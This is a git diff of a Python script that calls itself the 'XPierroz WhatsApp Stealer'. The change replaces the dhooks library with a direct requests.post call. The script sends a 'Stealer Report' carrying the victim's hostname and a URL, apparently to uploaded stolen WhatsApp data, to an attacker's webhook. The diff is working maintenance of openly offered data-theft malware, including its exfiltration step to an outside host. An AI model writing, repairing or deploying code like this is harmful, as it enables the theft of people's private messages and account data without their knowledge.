@@ -1,4 +1,3 @@
-import dhooks 
 import os
 import requests
 import time
@@ -35,17 +34,16 @@ os.remove(f"{os.getcwd()}\\ssouput.zip")
 
 message = f"**XPierroz WhatsApp Stealer Report**\n\n"
 message += f"📌 Pc: {socket.gethostname()}\n"
-message += f"🔍 Url: {m}"
+message += f"📎 Url: {m}"
 
-embed = dhooks.Embed(
-    title="🔔 Grab Alert",
-    description=message,
-    color=0xFF5733
-)
+payload = {
+    "content": message,
+    "username": "XPierroz WhatsApp Stealer",
+    "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true"
+}
 
-webhook = dhooks.Webhook(
-    url=WEBHOOK,
-    username="XPierroz WhatsApp Stealer",
-    avatar_url="https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true"
-)
-webhook.send(embed=embed)
+headers = {
+    "Content-Type": "application/json"
+}
+
+requests.post(WEBHOOK, json=payload, headers=headers)
